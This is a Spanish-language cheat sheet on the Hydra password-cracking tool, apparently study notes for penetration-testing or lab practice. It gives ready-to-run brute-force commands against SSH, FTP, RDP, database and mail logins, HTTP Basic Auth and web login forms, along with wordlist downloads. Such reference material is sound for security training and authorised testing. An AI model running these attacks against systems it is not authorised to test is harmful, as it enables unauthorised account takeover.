# Hydra

> Hydra es un cracker de login de red rápido con soporte para numerosos protocolos: SSH, FTP, HTTP (básico y formularios), SMTP, bases de datos, RDP, VNC, y más. Su ventaja principal es la paralelización de intentos, lo que acelera significativamente el ataque frente a scripts secuenciales.

### Sintaxis básica

```bash
hydra [login_options] [password_options] [attack_options] [service_options]
```

| Flag                   | Descripción                                                                          |
| ---------------------- | ------------------------------------------------------------------------------------ |
| `-l LOGIN` / `-L FILE` | Usuario único / archivo con lista de usuarios                                        |
| `-p PASS` / `-P FILE`  | Contraseña única / archivo con lista de contraseñas                                  |
| `-t TASKS`             | Hilos paralelos (por defecto varía según servicio)                                   |
| `-f`                   | Modo rápido: detiene el ataque al primer éxito                                       |
| `-s PORT`              | Puerto no estándar                                                                   |
| `-v` / `-V`            | Verbose / verbose extendido                                                          |
| `-x MIN:MAX:CHARSET`   | Genera contraseñas por rango de longitud y charset (fuerza bruta pura, sin wordlist) |
| `-M FILE`              | Lista de objetivos (múltiples hosts)                                                 |
| `service://server`     | Servicio y host objetivo                                                             |

### Servicios soportados

| Módulo                        | Protocolo             | Ejemplo                                                  |
| ----------------------------- | --------------------- | -------------------------------------------------------- |
| `ftp`                         | FTP                   | `hydra -l admin -P pass.txt ftp://192.168.1.100`         |
| `ssh`                         | SSH                   | `hydra -l root -P pass.txt ssh://192.168.1.100`          |
| `http-get` / `http-post-form` | Formularios/Auth HTTP | ver ejemplos abajo                                       |
| `smtp`                        | Correo saliente       | `hydra -l admin -P pass.txt smtp://mail.server.com`      |
| `pop3` / `imap`               | Correo entrante       | `hydra -l user@x.com -P pass.txt pop3://mail.server.com` |
| `mysql` / `mssql`             | Bases de datos        | `hydra -l root -P pass.txt mysql://192.168.1.100`        |
| `vnc`                         | Acceso remoto         | `hydra -P pass.txt vnc://192.168.1.100`                  |
| `rdp`                         | Escritorio remoto     | `hydra -l admin -P pass.txt rdp://192.168.1.100`         |

### Casos de uso

#### Fuerza bruta a autenticación HTTP básica (genérico)

```bash
hydra -L usernames.txt -P passwords.txt www.example.com http-get
```

Prueba cada combinación usuario/contraseña contra el sitio con el módulo `http-get`.

#### Múltiples servidores SSH con credenciales conocidas

```bash
hydra -l root -p toor -M targets.txt ssh
```

Útil cuando se sospecha una credencial común (ej. default) en varios hosts a la vez; `-M` reparte el ataque en paralelo por todos los targets del archivo.

#### FTP en puerto no estándar

```bash
hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp
```

`-s` sobrescribe el puerto por defecto del servicio; `-V` da visibilidad de cada intento.

#### Formulario de login web (POST)

```bash
hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```

`^USER^` y `^PASS^` son placeholders que Hydra sustituye. La condición de éxito se indica con:

* `S=<código>` — éxito si la respuesta devuelve ese código (ej. redirección 302 tras login correcto).
* `F=<texto>` — fallo si la respuesta contiene ese texto (ej. `F=incorrect`).

#### Fuerza bruta pura por rango de caracteres (RDP)

```bash
hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
```

`-x MIN:MAX:CHARSET` genera combinaciones sin necesitar wordlist — útil cuando se conoce el patrón aproximado de la contraseña (longitud, tipos de carácter) pero no una lista específica.

### Autenticación HTTP Básica

Basic Auth es un mecanismo challenge-response: al pedir un recurso protegido, el servidor responde `401 Unauthorized` con cabecera `WWW-Authenticate`, y el cliente reenvía usuario:contraseña codificado en Base64 dentro de la cabecera `Authorization`.

```http
GET /protected_resource HTTP/1.1
Host: www.example.com
Authorization: Basic YWxpY2U6c2VjcmV0MTIz
```

Es un objetivo frecuente de fuerza bruta porque el mecanismo en sí no incluye protecciones (rate limiting, CAPTCHA); esas defensas, si existen, se implementan aparte a nivel de servidor/aplicación.

#### Explotando Basic Auth con Hydra

Con el usuario ya conocido, el ataque se centra solo en la contraseña:

```bash
# Descargar wordlist si hace falta
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt

# Ataque
hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81
```

| Parte                                 | Función                              |
| ------------------------------------- | ------------------------------------ |
| `-l basic-auth-user`                  | Usuario fijo conocido                |
| `-P 2023-200_most_used_passwords.txt` | Wordlist de contraseñas              |
| `127.0.0.1`                           | Host objetivo                        |
| `http-get /`                          | Servicio HTTP GET sobre la ruta raíz |
| `-s 81`                               | Puerto no estándar                   |

Hydra prueba cada contraseña de la lista hasta encontrar la válida para ese usuario.

### Formularios de inicio de sesión (http-post-form)

Más allá de Basic Auth, la mayoría de aplicaciones web usan formularios de login propios: HTML con campos `username`/`password` y un `<form method="POST">` que envía los datos al servidor.

```html
<form action="/login" method="post">
  <input type="text" name="username">
  <input type="password" name="password">
  <input type="submit" value="Submit">
</form>
```

Al enviarse, genera una petición como:

```http
POST /login HTTP/1.1
Host: www.example.com
Content-Type: application/x-www-form-urlencoded

username=john&password=secret123
```

El módulo `http-post-form` de Hydra automatiza el envío de esa petición sustituyendo usuario y contraseña por valores de las wordlists.

#### Sintaxis

```bash
hydra [options] target http-post-form "path:params:condition_string"
```

#### Condición de éxito/fallo

| Condición    | Cuándo usarla                                                      | Ejemplo                 |
| ------------ | ------------------------------------------------------------------ | ----------------------- |
| `F=<texto>`  | Hay un mensaje de error identificable en login fallido (más común) | `F=Invalid credentials` |
| `S=<código>` | Login exitoso produce un código HTTP distintivo (ej. redirección)  | `S=302`                 |
| `S=<texto>`  | Login exitoso muestra contenido distintivo                         | `S=Dashboard`           |

`F=` es el enfoque más habitual: Hydra marca como fallo cualquier respuesta que contenga ese texto, y como éxito cualquiera que no lo contenga.

#### Recopilar los parámetros del formulario

Antes de lanzar el ataque hace falta conocer la ruta, los nombres exactos de los campos, y el mensaje/código de éxito o fallo. Formas de obtenerlo:

| Método                                  | Qué aporta                                                                                                     |
| --------------------------------------- | -------------------------------------------------------------------------------------------------------------- |
| Inspección manual (DevTools → Elements) | HTML del formulario: método, nombres de campos (`name="username"`)                                             |
| DevTools → pestaña Network              | Petición POST real enviada, con datos, cabeceras y respuesta del servidor                                      |
| Proxy (Burp Suite, OWASP ZAP)           | Captura e inspección detallada de la petición, útil en formularios más complejos (tokens CSRF, campos ocultos) |

Si el formulario incluye campos ocultos o tokens (CSRF), deben incluirse también en la cadena `params`, con valor estático o dinámico según el caso.

#### Ejemplo completo

Formulario detectado: método POST a `/`, campos `username` y `password`, mensaje de fallo `"Invalid credentials"`.

```bash
# Descargar wordlists
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt

# Ataque
hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 \
      http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

| Parte de la cadena params         | Significado                                     |
| --------------------------------- | ----------------------------------------------- |
| `/`                               | Ruta donde se envía el formulario               |
| `username=^USER^&password=^PASS^` | Campos del formulario con placeholders de Hydra |
| `F=Invalid credentials`           | Condición de fallo                              |

`-f` detiene el ataque en el primer par válido encontrado. Confirmado el hallazgo, se valida iniciando sesión manualmente con esas credenciales.
